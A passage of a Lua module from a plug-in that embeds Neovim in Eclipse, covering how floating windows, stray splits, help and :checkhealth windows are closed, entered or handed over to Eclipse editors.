    elseif closable(win) then -- leaving a float may have closed one
      leave_float_of(win)
      leave(win, fallback)
      close_quietly(win)
      closed[#closed + 1] = win
    end
  end
  return { closed, M.home_buffer() }
end

--- Whether win (0: the current one) is a window Neovim opened beside an editor's for a
--- moment, which :q, :close and Ctrl-W c close in Neovim, not the editor: a floating
--- window the user entered (hover documentation, a plug-in's picker) or one of Neovim's
--- special windows the safety net below leaves open (the command-line window).
--- Example: a second K into a hover float, then :q closes the float.
function M.is_side_window(win)
  win = win == 0 and vim.api.nvim_get_current_win() or win
  return not own[win] and vim.fn.win_gettype(win) ~= ''
end

--- Why :tabonly! does not run (WINDOW_COMMANDS refuses it): it would discard the changes of
--- every other editor tab at once, where Vim's keeps their buffers hidden.
M.TABS = "with ! it would discard every other editor tab's changes; :tabonly asks about them"
--- Whether win shows one of ui2's own buffers (its command line, messages, pager or
--- prompt; LuaScripts.UI2): Neovim's own windows, which the safety net leaves alone.
local function shows_ui2_buffer(win)
  local ui2 = package.loaded['vim._core.ui2']
  if not ui2 or not vim.api.nvim_win_is_valid(win) then
    return false
  end
  local buf = vim.api.nvim_win_get_buf(win)
  for _, own in pairs(ui2.bufs) do
    if own == buf then
      return true
    end
  end
  return false
end

--- While Neovim is still starting (v:vim_did_enter 0: a configuration still running,
--- lazy.nvim installing missing plug-ins in vim.wait), brings the plug-ins' floating
--- windows of the other tab pages into win's, the editor Eclipse shows: a float belongs to
--- one tab page, and one the configuration opened before any editor was there (lazy.nvim's
--- installer and its backdrop, in the home window's tab page) would otherwise be drawn
--- nowhere, the install looking like Eclipse hung. Moved as they are, placed on the screen
--- (relative 'editor'; one hanging on a window or the cursor stays where it is), with
--- the focus where it was. Once Neovim has started, floats stay in their own tab page,
--- as in Neovim. Neither the plug-in's own windows nor ui2's are moved. What closes such
--- a float at the start's end is close_start_floats. Example: lazy.nvim's window 1001 in
--- tab page 1, the first editor shown in tab page 2: 1001 moves to tab page 2, drawn
--- over the editor with its progress. starting: whether Neovim is still starting (M.show
--- passes v:vim_did_enter ~= 1; a spec passes it, being past the start).
function M.bring_start_floats(win, starting)
  if not starting or not vim.api.nvim_win_is_valid(win) then
    return
  end
  local tab = vim.api.nvim_win_get_tabpage(win)
  for _, w in ipairs(vim.api.nvim_list_wins()) do
    local config = vim.api.nvim_win_get_config(w)
    if not own[w] and config.relative == 'editor' and not shows_ui2_buffer(w)
        and vim.api.nvim_win_get_tabpage(w) ~= tab then
      config.win = win
      pcall(vim.api.nvim_win_set_config, w, config)
    end
  end
end

--- Whether win (0: the current one) is a floating window of a plug-in, not the
--- plug-in's own and not one of ui2's: a picker's prompt (Telescope), :Lazy, a hover
--- float the user entered. An insert that begins in one is Neovim's to its end
--- (SETUP's ModeChanged report): its buffer is no document, so Eclipse must not type it.
function M.focused_float(win)
  win = win == 0 and vim.api.nvim_get_current_win() or win
  return not own[win] and vim.fn.win_gettype(win) == 'popup' and not shows_ui2_buffer(win)
end

--- The window Eclipse's scripts for the editor's view act on (VIEWPORT_OVERHEAD, SET_FOLDS,
--- SET_WRAP, SET_TOPLINE, SCROLL_LINES): the current one, or, while Neovim is in a
--- plug-in's float (a picker's prompt, lazy.nvim's installer), the window of the
--- plug-in's own under it, the editor's or page's of that tab page. They run in it with
--- nvim_win_call, which fires no autocommands, so the float keeps the focus. Example: the
--- editor resized while :Lazy is open: Neovim's screen is measured on the editor's window.
function M.editor_window()
  local current = vim.api.nvim_get_current_win()
  if not M.focused_float(current) then
    return current
  end
  for _, w in ipairs(vim.api.nvim_tabpage_list_wins(vim.api.nvim_win_get_tabpage(current))) do
    if own[w] and vim.api.nvim_win_get_config(w).relative == '' then
      return w
    end
  end
  return current
end

--- Whether Neovim entered win, a plug-in's float, to stay: one rule for every plug-in's
--- float with the cursor (a picker's prompt as it opens, :Lazy, a hover float entered
--- by a second K), current, entered outside an insert. SETUP's BufEnter report says so, and Eclipse leaves Neovim there
--- (util/EnterDecision) instead of sending it back to the editor's window, where the
--- insert a picker starts next would begin and Eclipse would type it. Not the buffer's
--- kind: Telescope makes its prompt buffer a prompt only after entering the window
--- (plenary's popup opens a scratch buffer, then Telescope sets 'buftype'). One entered
--- during an insert (a plug-in's timer while Eclipse types) is sent back, as before:
--- the insert is the editor's. Unless that insert began in a plug-in's float
--- (insert_float, set at InsertEnter; not the previous window, which a plug-in can pass
--- through without an autocommand): a click from a picker's prompt on a second float
--- enters that one still in Insert mode, and sent back, the next letters would land in
--- the file. Leaving the editor moves Neovim out of the float (M.move_out_of_float). Whether
--- the editor draws it is not asked here: one it does not draw (hidden, past the limits)
--- is closed in the one place that decides it, M.close_undrawn.
function M.entered_float(win)
  if not M.focused_float(win) or win ~= vim.api.nvim_get_current_win() then
    return false
  end
  if not vim.api.nvim_get_mode().mode:match('^[iR]') then
    return true
  end
  return S.insert_float ~= nil
end

--- Closes win, a plug-in's float, as leaving it does: not by force, so that a buffer of
--- the user's with unsaved changes is not lost. With 'hidden' (Neovim's default) the
--- window closes and the buffer stays, hidden and changed (:ls lists it); Neovim refuses
--- only when closing would unload or wipe it ('bufhidden', 'nohidden'). A prompt, a
--- scratch or terminal buffer never counts as changed: Telescope's and lazy.nvim's close.
--- Refused, Neovim leaves the float for the editor's window of its tab, and the float
--- stays, drawn without the focus. Whether it closed.
local function close_float(win)
  -- Asked of the window, not of the call: a plug-in's WinClosed, BufWinLeave or BufHidden
  -- handler that throws makes nvim_win_close fail after the window has gone.
  if pcall(vim.api.nvim_win_close, win, false) or not vim.api.nvim_win_is_valid(win) then
    return true
  end
  if win == vim.api.nvim_get_current_win() then
    for _, w in ipairs(vim.api.nvim_tabpage_list_wins(vim.api.nvim_win_get_tabpage(win))) do
      if own[w] then
        pcall(vim.api.nvim_set_current_win, w)
        break
      end
    end
  end
  return false
end

--- Whether win, the float a route of Eclipse's names (M.leave_float, M.move_out_of_float),
--- is another than current, the window Neovim is in: then Neovim has gone on since, and
--- stays where it is. nil, 0 or -1 name none.
local function names_other(win, current)
  return win ~= nil and win > 0 and win ~= current
end

--- Leaves the plug-in's float the cursor is in, closing it (close_float): the user turned
--- Neovim mode off, its editor is closing, or the editor does not draw it. For the user
--- clicking away, M.move_out_of_float keeps it open. An insert in it ends first. Again
--- while the window Neovim is in then is a plug-in's float too (a picker's results,
--- should its plug-in leave the focus there), so that the cursor ends outside every one;
--- a plug-in closes its other windows itself when its prompt closes (Telescope does).
--- win (optional): the float to close instead, though Neovim may have gone on since; only
--- that one closes, and an insert Neovim carried out of it ends. Whether one was closed.
--- Example: Telescope's prompt open, Eclipse mode turned on: the prompt closes, Telescope
--- closes its results and preview, Neovim is back in the editor's window.
function M.leave_float(win)
  local current = vim.api.nvim_get_current_win()
  local named = names_other(win, current)
  local target = named and win or current
  -- The insert begun in the float ends, also when Neovim already went on with it and the
  -- float closed itself on leaving (a plug-in's input that closes on BufLeave); not an
  -- insert begun elsewhere since (Eclipse's, in the editor the user went to). With a float
  -- named, only that float's insert: Neovim is no longer in it, and a float it is in now
  -- may be the next part's picker, whose own insert began since.
  local stop = in_insert() and S.insert_float ~= nil
    and (S.insert_float == target or (not named and M.focused_float(current)))
  local closed = false
  if vim.api.nvim_win_is_valid(target) and M.focused_float(target) then
    if named then
      closed = close_float(target)
    else
      for _ = 1, 10 do -- a bound: each round closes a window, so a plug-in reopening one cannot loop
        local w = vim.api.nvim_get_current_win()
        if not M.focused_float(w) or not close_float(w) then
          break
        end
        closed = true
      end
    end
  end
  if stop then
    stop_insert_in_place() -- in the window Neovim is in by now, the editor's
  end
  return closed
end

--- Moves Neovim out of the plug-in's float it is in, to the editor's or page's window of that
--- tab page, and leaves the float open: what a click outside a float does in a terminal.
--- The plug-in decides whether its window survives that: Telescope closes its picker on
--- BufLeave, and :Lazy stays, drawn without the focus, until it is clicked or closed. For
--- the user clicking the text or leaving for another part of Eclipse
--- (editor/LineOnFocusLoss, NeovimEditorController). An insert begun in the float ends, as
--- in M.leave_float. win (optional): the float the cursor was in when the keyboard left a
--- part; when Neovim has gone on since, there is nothing to move, and only that float's
--- insert ends. Whether Neovim moved.
function M.move_out_of_float(win)
  local current = vim.api.nvim_get_current_win()
  local named = names_other(win, current)
  local target = named and win or current
  local stop = in_insert() and S.insert_float ~= nil
    and (S.insert_float == target or (not named and M.focused_float(current)))
  local moved = false
  if not named and M.focused_float(current) then
    local to = M.editor_window() -- the float itself when its tab page has no window of ours
    moved = to ~= current and pcall(vim.api.nvim_set_current_win, to)
  end
  if stop then
    stop_insert_in_place() -- in the window Neovim is in by now, the editor's
  end
  return moved
end

--- Why the window Neovim is in, a plug-in's float, is one the editor does not draw, as
--- M.close_undrawn words it, or nil when it is none (see there).
local function undrawn_why(win, past_limits)
  local current = vim.api.nvim_get_current_win()
  if not M.focused_float(current) then
    return nil
  elseif vim.api.nvim_win_get_config(current).hide then
    return HIDDEN
  elseif win == current then
    return 'the editor cannot draw it' .. (past_limits and ' (' .. past_limits .. ')' or '')
  end
  return nil
end

--- Closes the plug-in's float Neovim is in when the editor does not draw it, with a message:
--- keys go only to a window Eclipse draws, and these would go into one nobody sees. The one
--- place that decides it, for every way a float can be undrawn: the session calls it from the
--- redraw flush that finds Neovim's cursor on a grid it does not draw (util/Grids.unseenCursor),
--- whatever route led there (a float that opens with the focus, one entered later, one its
--- plug-in hides), and it acts only on what it finds here itself: the current window, a
--- plug-in's float (M.focused_float), and why it is undrawn: hidden by its plug-in (config
--- hide), or past util/Grids' limits, which only the session can tell: then win, the window
--- the session saw on that grid, is this one, and past_limits words the limits. Else
--- nothing: a float the session has not placed yet (its position comes with a later redraw),
--- or Neovim has moved on. Not by force (M.leave_float, close_float): a changed buffer stays,
--- and an insert begun in the float ends; a float Neovim refuses to close stays, with a
--- message. Whether it closed.
--- Example: Telescope's prompt hidden by a plug-in of its own while Neovim is in it: closed,
--- with "Closed the floating window of TelescopePrompt: it is hidden, and it would take the
--- keys unseen".
function M.close_undrawn(win, past_limits)
  local why = undrawn_why(win, past_limits)
  if not why then
    return false
  end
  local current = vim.api.nvim_get_current_win()
  local name = float_name(current)
  if not M.leave_float() then
    -- Said whether Neovim got out of it or, with no editor's window in its tab page to
    -- go to, is still in it: then this message is the only sign of where the keys go.
    vim.api.nvim_echo({ { M.float_kept_message(name, why .. UNSEEN) } }, true, { err = true })
    return false
  end
  vim.api.nvim_echo({ { M.float_closed_message(name, why .. UNSEEN) } }, true, { err = true })
  return true
end

--- For each route of Eclipse's that can take Neovim out of a float, with the arguments of
--- its script (core/LuaScripts.FLOAT_EXITS names the route of each script): whether that
--- script will leave the plug-in's float Neovim is in now. The same rule as the script's
--- own, in one place each (closable, in_float_of, names_other, undrawn_why), so that the
--- first step (M.end_float_insert) ends an insert only where the second leaves its float.
--- Example: a background editor closing while the user types in Telescope's prompt over
--- another: close is false, and the prompt keeps its insert.
local leaves = {
  -- FOCUS_WINDOW (win, from): enters win, a page's window, when it is still there.
  focus = function(win)
    return win ~= nil and vim.api.nvim_win_is_valid(win)
  end,
  -- SHOW_WINDOW (win, buf): enters win (-1: the home window) unless M.show refuses.
  show = function(win, buf)
    return shows(win, buf)
  end,
  -- CLOSE_WINDOW (win, fallback): leaves a float in win's tab page (M.close).
  close = function(win)
    return closing_leaves_float(win)
  end,
  -- RELEASE_BUFFER (buf, fallback): leaves a float in the tab page of a window it closes,
  -- or a float that shows buf itself (M.release).
  release = function(buf)
    for _, win in ipairs(vim.api.nvim_buf_is_valid(buf) and vim.fn.win_findbuf(buf) or {}) do
      if closing_leaves_float(win) then
        return true
      end
    end
    return false
  end,
  -- LEAVE_FLOAT, MOVE_OUT_OF_FLOAT (win), LEAVE_FLOAT_WITH_LINE (): the current float,
  -- unless another is named.
  move = function(win)
    return not names_other(win, vim.api.nvim_get_current_win())
  end,
  -- CLOSE_UNDRAWN_FLOAT (win, past_limits): the current float, when it is undrawn.
  undrawn = function(win, past_limits)
    return undrawn_why(win, past_limits) ~= nil
  end,
}

--- The first of two steps for every route of Eclipse's that takes Neovim out of a float
--- (core/DocumentBuffers.leavingFloat): ends the insert begun in the float while Neovim is
--- still in it, when the second step, route's script with these arguments, will leave it
--- (leaves). The second step, the move or the close, is the next call: :stopinsert takes
--- effect as this call returns, before Neovim reads the next one. Why not in one step: an
--- insert that has only auto-indented ('o', nothing typed) ends by removing the white space
--- at the cursor of the window Neovim is in, and ended from the editor's window that is the
--- document's line. Example: 'o' in a float, a click on the text: the float's empty line
--- loses its indent, the document keeps its own. Also an insert waiting to go on after
--- Ctrl-O: Neovim reports Visual, Select or the command line then ('i<C-o>v', 'i<C-o>:'),
--- not insert, so only plain Normal mode ('n', where no insert waits) is left alone;
--- elsewhere :stopinsert ends the insert or the wait for it, and else only Terminal mode
--- (a terminal in the float), which the second step leaves anyway.
--- Not the float waiting for the first editor (settle_start_float), which keeps the
--- keyboard and its insert. An unknown route is an error, a script without its entry.
--- Whether :stopinsert ran.
function M.end_float_insert(route, ...)
  local leaving = leaves[route]
  if not leaving then
    error('no float exit named ' .. tostring(route))
  end
  local current = vim.api.nvim_get_current_win()
  if S.insert_float == nil or current == S.pending_start_float or not M.focused_float(current)
      or vim.api.nvim_get_mode().mode == 'n' or not leaving(...) then
    return false
  end
  vim.cmd.stopinsert()
  return true
end

--- Why the safety net closed a window, by win_gettype(): '' for a plain one (a split
--- opened without the command line, which Eclipse never heard of).
local why_closed = {
  [''] = 'Eclipse shows each window as an editor; :split and :vsplit make one',
  quickfix = 'Eclipse cannot show the quickfix window; :cnext, :cprevious and :cc still work',
  loclist = 'Eclipse cannot show the location list window; :lnext, :lprevious and :ll still work',
  preview = 'Eclipse cannot show the preview window',
}

local group = vim.api.nvim_create_augroup('neovim4eclipse_windows', { clear = true })

--- The one rule for keys typed while Neovim starts: they go where they would in a terminal,
--- to the window Neovim is in when it reads them, as long as the editor draws that window. A
--- config's init can keep running while Eclipse is set up and an editor attached (lazy.nvim
--- installing missing plug-ins waits with vim.wait, in rounds), and a plug-in can open a float
--- with the focus meanwhile and have VimEnter enter it again (lazy.nvim's window); the keys the
--- user types then wait in Neovim's input, which Neovim reads only once its start is over. So
--- at UIEnter, after every VimEnter and before any of those keys is read, the check looks at
--- where Neovim is. A float in the tab page of the window Eclipse has attached (asked of
--- Eclipse there and then, eclipse_attached_window), and not hidden, is drawn: it keeps the
--- keyboard, and the one the config left the focus in before the plug-in set Neovim's windows
--- up (LEAVE_START_FLOAT hands it over) is entered again, since only the plug-in took Neovim
--- out of it. A float the editor does not draw is closed (not by force, a changed buffer
--- stays), with one message naming the first, and Neovim goes to the attached window: keys go
--- only to a window Eclipse draws. When Neovim has already entered (an init that does not
--- wait: the usual start), it happens at once. With no editor shown yet, the float cannot be
--- drawn anywhere: it waits for the first one, whose M.show brings it along and enters it
--- (settle_start_float). A float opened after that is any other plug-in's, and
--- M.close_undrawn watches it. As in a terminal, keys typed during an install
--- are lazy.nvim's then: U, S, X and R are its commands.
--- Whether it closed one now (false: at UIEnter, or nothing to close). Example: LazyVim's
--- first start: its installer stays over the first editor, with the keyboard, and q closes it.
function M.close_start_floats(left)
  local function close()
    -- Eclipse's own answer, not a copy kept here: the editor it attached last (the home
    -- window before any). No channel: not Eclipse's Neovim (the Lua specs).
    local chan = vim.g.neovim4eclipse_channel
    local ok, attached = false, nil
    if chan then
      ok, attached = pcall(vim.rpcrequest, chan, 'eclipse_attached_window')
    end
    local has_attached = ok and type(attached) == 'number' and attached > 0
      and vim.api.nvim_win_is_valid(attached)
    local shown_tab = has_attached and vim.api.nvim_win_get_tabpage(attached)
      or vim.api.nvim_get_current_tabpage()
    local function drawn(w)
      return vim.api.nvim_win_is_valid(w) and M.focused_float(w)
        and not vim.api.nvim_win_get_config(w).hide and vim.api.nvim_win_get_tabpage(w) == shown_tab
    end
    local name
    if left and left > 0 and vim.api.nvim_win_is_valid(left) then
      if drawn(left) then
        if not M.focused_float(vim.api.nvim_get_current_win()) then
          if S.editor_shown then
            pcall(vim.api.nvim_set_current_win, left)
          else
            S.pending_start_float = left
          end
        end
      else
        local n = float_name(left)
        if pcall(vim.api.nvim_win_close, left, false) then
          name = n
        end
      end
    end
    local current = vim.api.nvim_get_current_win()
    if M.focused_float(current) and not drawn(current) then
      local n = float_name(current)
      if M.leave_float() then
        name = name or n
      end
    elseif M.focused_float(current) and not S.editor_shown then
      S.pending_start_float = current
    end
    if not drawn(vim.api.nvim_get_current_win()) and has_attached
        and attached ~= vim.api.nvim_get_current_win() then
      pcall(vim.api.nvim_set_current_win, attached)
    end
    if name then
      say_at_start(M.float_closed_message(name, AT_START)) -- the keys typed meanwhile come first
    end
    return name ~= nil
  end
  if vim.v.vim_did_enter == 1 then
    return close()
  end
  vim.api.nvim_create_autocmd('UIEnter', { group = group, once = true, callback = function() close() end })
  return false
end
-- 'mouse', told to Eclipse, which checks it before it sends a click on a grid (a floating
-- window, q:, a page; util/MouseOption). Eclipse cannot ask at the click: Neovim holds an
-- option read while it waits for a key (after f or r). Nor can Neovim drop the click as
-- it reads it: vim.on_key runs after mappings, and dropping the first key of a mapping's
-- right-hand side would run the rest as commands on the user's text. Told at each change,
-- and looked at again at each mode change, for a :noautocmd set. "h" means every mode in
-- a help buffer, so there it is told with an "a". Example: "nvi"; "ha" in :help with "h".
local told_mouse
local function tell_mouse()
  local value = vim.o.mouse
  if value:find('h', 1, true) and vim.bo.buftype == 'help' then
    value = value .. 'a'
  end
  if value ~= told_mouse then
    told_mouse = value
    vim.rpcnotify(vim.g.neovim4eclipse_channel or 0, 'eclipse_mouse_option', value)
  end
end
vim.api.nvim_create_autocmd({ 'ModeChanged', 'BufEnter', 'BufWinEnter', 'UIEnter' },
  { group = group, callback = tell_mouse })
vim.api.nvim_create_autocmd('OptionSet',
  { group = group, pattern = { 'mouse', 'buftype' }, callback = tell_mouse })
tell_mouse()
-- Where each insert begins (insert_float, above).
vim.api.nvim_create_autocmd('InsertEnter', {
  group = group,
  callback = function()
    local w = vim.api.nvim_get_current_win()
    S.insert_float = M.focused_float(w) and w or nil
  end,
})
vim.api.nvim_create_autocmd('WinClosed', {
  group = group,
  callback = function(ev)
    own[tonumber(ev.match)] = nil
    page_buf[tonumber(ev.match)] = nil
    page_kind[tonumber(ev.match)] = nil
    seen[tonumber(ev.match)] = nil
    opened_from[tonumber(ev.match)] = nil
    from_editor[tonumber(ev.match)] = nil
    vim.rpcnotify(vim.g.neovim4eclipse_channel or 0, 'eclipse_window_closed', tonumber(ev.match))
  end,
})
-- The second safety net: a window opened next to an editor's, in its tab, by something the
-- refusals do not see (a plug-in's :split, <Cmd>split, vim.cmd.split()). On a file it
-- becomes an Eclipse split or editor tab (take_file_window). Any other Eclipse would not
-- show, but it would take the keys and half the editor's rows. Closed once the
-- command that opened it is over, not inside its own WinNew, while that command still
-- runs (and still fills the window, as :checkhealth does). The quickfix, location list and preview windows
-- (:copen, :lopen, :pedit) are closed too: Eclipse cannot show them either, and in the
-- editor's tab they would take its rows, so H, L and scrolling would no longer match
-- the editor; the lists themselves stay, for :cnext and the like. Left alone: the
-- plug-in's own windows, floating windows (hover, completion documentation; their
-- win_gettype() is 'popup'), the windows of 'autocmd' (gone at once), and the
-- command-line window ('command'), which has its own rule (SETUP).
-- A closed quickfix or location list window is shown the Eclipse way instead of the
-- message, when the quickfix module is there (QUICKFIX: the Problems or Tasks view, or
-- the list's :clist, shown by Neovim), so :copen does what it is for.
-- Floating windows are left alone here, the one that opened with the focus too (a
-- picker's prompt, :Lazy, a dashboard): drawn, it takes the keys, and leaving the editor
-- moves Neovim out of it (M.move_out_of_float); one the editor does not draw is closed by
-- M.close_undrawn.
-- A :checkhealth report opens in a window of its own however it is asked for (a new
-- tab, a split with :vert, a float with vim.g.health's style 'float'), and Neovim has
-- filled it and set its filetype by the time this net runs (after the command). Its
-- buffer goes to a page editor instead (eclipse_view_page, then M.show_page): kept
-- when its window closes ('bufhidden' hide: a float's would be wiped), unlisted, so
-- that :ls and :bnext never meet it, and renamed health://<number>, since the next
-- :checkhealth wipes whatever is named health://. Matched by all three marks Neovim's
-- report has (filetype, scratch buffer, its name), so a file the user gave the
-- filetype by hand is never taken.
-- Neovim goes back to the window the report's was opened from first, then the window
-- closes. Closed while current, its tab would hand Neovim to the next tab, another
-- editor's.
local function take_health_report(win)
  -- An earlier close in this pass (or an autocmd it fired) may have closed this window
  -- too; reading it would throw and end the whole net, leaving later windows open.
  if not vim.api.nvim_win_is_valid(win) then
    return false
  end
  local before = opened_from[win]
  local buf = vim.api.nvim_win_get_buf(win)
  if vim.bo[buf].filetype ~= 'checkhealth' or vim.bo[buf].buftype ~= 'nofile'
      or vim.api.nvim_buf_get_name(buf) ~= 'health://' then
    return false
  end
  vim.bo[buf].bufhidden, vim.bo[buf].buflisted = 'hide', false
  -- A name of its own: Neovim's next :checkhealth wipes the buffer named health://
  -- first, which would close the page window showing this one.
  pcall(vim.api.nvim_buf_set_name, buf, 'health://' .. buf)
  -- A rename leaves the old name behind as an empty unlisted buffer (the alternate
  -- file, as :file does): wiped, so :ls! shows no stray health://.
  for _, b in ipairs(vim.api.nvim_list_bufs()) do
    if b ~= buf and vim.api.nvim_buf_get_name(b) == 'health://' and not vim.bo[b].buflisted
        and #vim.fn.win_findbuf(b) == 0 and vim.api.nvim_buf_line_count(b) <= 1 then
      pcall(vim.api.nvim_buf_delete, b, { force = true })
    end
  end
  if before and own[before] and vim.api.nvim_win_is_valid(before) then
    pcall(vim.api.nvim_set_current_win, before)
  end
  pcall(vim.api.nvim_win_close, win, true)
  vim.rpcnotify(vim.g.neovim4eclipse_channel or 0, 'eclipse_view_page', 'checkhealth', buf, 1)
  return true
end
-- A help window (:help, :helpgrep, :cnext through a :helpgrep list, a plug-in's
-- vim.cmd.help, in a split, a tab or with :vert): Eclipse shows help in a page editor
-- instead, a page window of this Neovim on the same help buffer (docs/ARCHITECTURE.md,
-- decision 10), so Ctrl-], :helpgrep and the user's own help pages work as in a
-- terminal. By the time this net runs, :help has set 'buftype' help and put the cursor
-- on the topic: the buffer and that line go to Eclipse (eclipse_view_page, then
-- M.show_page). Then, as for a report, back to the window it came from and the window
-- closed; the buffer is kept ('bufhidden' hide, whatever 'hidden' says). Inside the
-- help editor :help reuses its own window and never reaches this net (M.follow_page).
local function take_help(win)
  if not vim.api.nvim_win_is_valid(win) or vim.fn.win_gettype(win) ~= '' then
    return false
  end
  local buf = vim.api.nvim_win_get_buf(win)
  local document = M.is_document(buf) and vim.bo[buf].buftype == 'help'
  if not document and not page_ok(buf, 'help') then
    return false
  end
  local line = vim.api.nvim_win_get_cursor(win)[1]
  if not document then
    vim.bo[buf].bufhidden = 'hide'
  end
  local before = opened_from[win]
  if before and own[before] and vim.api.nvim_win_is_valid(before) then
    pcall(vim.api.nvim_set_current_win, before)
  end
  pcall(vim.api.nvim_win_close, win, true)
  if document then
    give_document_back(buf) -- the window closed, no page: the editor keeps its document
  else
    vim.rpcnotify(vim.g.neovim4eclipse_channel or 0, 'eclipse_view_page', 'help', buf, line)
  end
  return true
end
--- Before win closes with force: a changed buffer stays, hidden. Without this its
--- 'bufhidden' (wipe, delete, unload) would discard the changes with its last window.
--- Only a buffer that can be written: a scratch buffer's 'modified' protects nothing.
local function keep_changes(win)
  local buf = vim.api.nvim_win_get_buf(win)
  local buftype = vim.bo[buf].buftype
  if vim.bo[buf].modified and (buftype == '' or buftype == 'acwrite')
      and #vim.fn.win_findbuf(buf) == 1 then
    vim.bo[buf].bufhidden = 'hide'
  end
end
--- The file of buf if a plug-in's window on it can become an Eclipse editor: an open
--- document, or a plain buffer of a readable file without unsaved changes. Nothing else
--- (a scratch or terminal buffer, a name like fugitive://, an untitled editor's), so
--- that what passes is what :split file could open. Closing a window on a document
--- loses nothing, since the document's own editor keeps showing its buffer.
local function file_to_hand_over(buf)
  local document = M.is_document(buf)
  local name = vim.b[buf].neovim4eclipse_file or vim.api.nvim_buf_get_name(buf)
  if not document and (vim.bo[buf].buftype ~= '' or vim.bo[buf].modified) then
    return nil
  end
  if name == '' or vim.fn.isabsolutepath(name) == 0 or name:match('^%a[%w+.-]*://')
      or vim.fn.filereadable(name) ~= 1 then
    return nil
  end
  return name
end
--- A plug-in's window on a file (a picker's Ctrl-V, Ctrl-X or Ctrl-T, a plain
--- vim.cmd.split(file)) becomes an Eclipse split or editor tab, on the side Neovim put
--- it and at its cursor; Neovim's window closes. Eclipse shows each window as an editor,
--- so this is the window the plug-in asked for. Decided here because every window a
--- plug-in opens passes this net. Example: Ctrl-V on b.txt in Telescope, with
--- 'splitright' off: a window left of the editor's, so an editor to its left.
local function take_file_window(win)
  local commands = package.loaded['neovim4eclipse.window_commands']
  if not commands or not vim.api.nvim_win_is_valid(win) or vim.fn.win_gettype(win) ~= '' then
    return false
  end
  local buf = vim.api.nvim_win_get_buf(win)
  local file = file_to_hand_over(buf)
  if not file then
    return false
  end
  local tab = vim.api.nvim_win_get_tabpage(win)
  -- Read from Neovim, not remembered: an editor's window that is current is where the
  -- action is (a plug-in's split opened without entering it, the next window of a
  -- pass). Else Neovim is in a plug-in's window: the editor that one came from.
  local current = vim.api.nvim_get_current_win()
  -- Opened behind a float that has the keyboard: left to the net's plain close. Handing
  -- it over would move Neovim into the editor, still in the float's mode. Example: a
  -- plug-in's background split while Telescope's prompt is in Insert mode; the next
  -- keys would be typed into the document.
  if win ~= current and M.focused_float(current) then
    return false
  end
  local before = own[current] and current or from_editor[win] or from_editor[current]
  if not (before and own[before] and vim.api.nvim_win_is_valid(before)) then
    before = nil -- none known: its tab's editor
    for _, w in ipairs(vim.api.nvim_tabpage_list_wins(tab)) do
      if own[w] then
        before = w
        break
      end
    end
  end
  if not before and win == current then
    -- A tab page opened with :noautocmd: no WinEnter said where from, and no editor is in
    -- it. Neovim keeps the tab page it came from as the previous one.
    local previous = vim.fn.tabpagenr('#')
    local w = previous > 0 and vim.fn.win_getid(vim.fn.tabpagewinnr(previous), previous) or 0
    before = own[w] and w or nil
  end
  if not before then
    return false
  end
  local at = vim.api.nvim_win_get_cursor(win)
  pcall(vim.api.nvim_set_current_win, before)
  -- An insert begun in a float must not go on in the editor: a plug-in that opens the
  -- split without :stopinsert would leave the next keys typing into the document.
  if S.insert_float ~= nil and in_insert() then
    stop_insert_in_place()
  end
  local where = 'tab'
  if vim.api.nvim_win_get_tabpage(before) == tab then
    local new, old = vim.fn.win_screenpos(win), vim.fn.win_screenpos(before)
    if new[1] == old[1] then
      where = new[2] < old[2] and 'left' or 'right'
    else
      where = new[1] < old[1] and 'above' or 'below'
    end
  end
  keep_changes(win)
  if not pcall(vim.api.nvim_win_close, win, true) then
    return false
  end
  commands.open_beside(where, file, at[1], at[2] + 1)
  return true
end
-- The window last left: when a command opens a window and enters it (:checkhealth's
-- `tab sbuffer`, a split), WinLeave fires in the old window, then WinNew and WinEnter in
-- the new. A window opened without entering it (nvim_open_win(buf, false, ...)) fires
-- WinNew alone, with that window current for the moment, so only WinEnter says that
-- left_from is where a window came from: at WinNew it may be an editor left long ago.
local left_from = S.home
vim.api.nvim_create_autocmd('WinLeave', {
  group = group,
  callback = function()
    left_from = vim.api.nvim_get_current_win()
  end,
})
vim.api.nvim_create_autocmd('WinEnter', {
  group = group,
  callback = function()
    local win = vim.api.nvim_get_current_win()
    if win ~= left_from and not own[win] and not opened_from[win] then
      opened_from[win] = left_from
      from_editor[win] = own[left_from] and left_from or from_editor[left_from]
    end
  end,
})
--- The net itself: looks at each window it has not seen yet. Scheduled, so that the command
--- that opened the window is over.
local function check_new_windows()
  local why, list
  local quickfix = package.loaded['neovim4eclipse.quickfix']
  for _, win in ipairs(vim.api.nvim_list_wins()) do
    -- ui2's windows (UI2) showing ui2's own buffers are Neovim's command line and
    -- messages: never closed. One showing another buffer is a float like any other.
    local new = not seen[win] and not shows_ui2_buffer(win)
    seen[win] = true
    local wintype = vim.fn.win_gettype(win)
    -- A report taken leaves its window closed: the checks below then pass it by.
    local taken = new and not own[win] and (take_health_report(win) or take_help(win)
      or take_file_window(win))
    local reason = not taken and not own[win] and why_closed[wintype]
    if reason and vim.api.nvim_win_is_valid(win) then
      keep_changes(win)
    end
    if reason and vim.api.nvim_win_is_valid(win) and pcall(vim.api.nvim_win_close, win, true) then
      if quickfix and (wintype == 'quickfix' or wintype == 'loclist') then
        list = list or wintype
      else
        why = why or reason
      end
    end
  end
  if why then
    vim.api.nvim_echo({ { 'Window closed: ' .. why } }, true, { err = true })
  end
  if list then
    quickfix.window(list)
  end
end
vim.api.nvim_create_autocmd('WinNew', {
  group = group,
  callback = function()
    vim.schedule(check_new_windows)
  end,
})
-- :noautocmd split fires no WinNew, and Neovim would go on in a window Eclipse does not
-- draw, with the keys editing its buffer unseen. SafeState comes as Neovim is about to
-- wait for a key, whatever opened the window, so the net still runs.
vim.api.nvim_create_autocmd('SafeState', {
  group = group,
  callback = function()
    for _, win in ipairs(vim.api.nvim_list_wins()) do
      if not seen[win] then
        vim.schedule(check_new_windows)
        return
      end
    end
  end,
})
package.loaded['neovim4eclipse.windows'] = M
return S.home
